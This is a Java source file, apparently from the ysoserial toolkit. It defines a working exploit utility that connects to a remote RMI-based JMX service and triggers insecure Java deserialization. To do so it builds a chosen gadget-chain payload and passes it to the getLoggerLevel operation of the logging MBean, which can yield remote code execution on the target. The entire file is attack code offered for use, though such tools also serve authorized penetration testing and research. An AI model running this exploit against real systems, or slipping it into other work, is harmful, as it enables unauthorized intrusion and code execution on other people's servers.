package ysoserial.exploit;

import ysoserial.payloads.ObjectPayload;

import javax.management.MBeanServerConnection;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import java.util.Arrays;

/*
 * Utility program for exploiting RMI based JMX services running with required gadgets available in their ClassLoader.
 * Attempts to exploit the service by invoking a method on a exposed MBean, passing the payload as argument.
 *
 */
public class JMXInvokeMBean {

    public static void main(String[] args) throws Exception {
        if (args.length < 4) {
            System.err.println(JMXInvokeMBean.class.getName() + " <host> <port> <payload_type> <payload_args...>");
            System.exit(-1);
            return;
        }

        JMXServiceURL url = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + args[0] + ":" + args[1] + "/jmxrmi");

        JMXConnector jmxConnector = JMXConnectorFactory.connect(url);
        MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();

        final String[] payloadArgs = Arrays.copyOfRange(args, 3, args.length);

        // create the payload
        final Object payloadObject;
        try {
            payloadObject = ObjectPayload.Utils.makePayloadObject(args[2], payloadArgs);
        } catch (Throwable e) {
            if (e instanceof IllegalStateException
                || e instanceof IllegalArgumentException) {
                System.err.println(e.getMessage());
            } else {
                e.printStackTrace();
            }
            System.exit(-1);
            return;
        }

        ObjectName mbeanName = new ObjectName("java.util.logging:type=Logging");

        mbeanServerConnection.invoke(mbeanName, "getLoggerLevel", new Object[]{payloadObject}, new String[]{String.class.getCanonicalName()});

        //close the connection
        jmxConnector.close();
    }
}
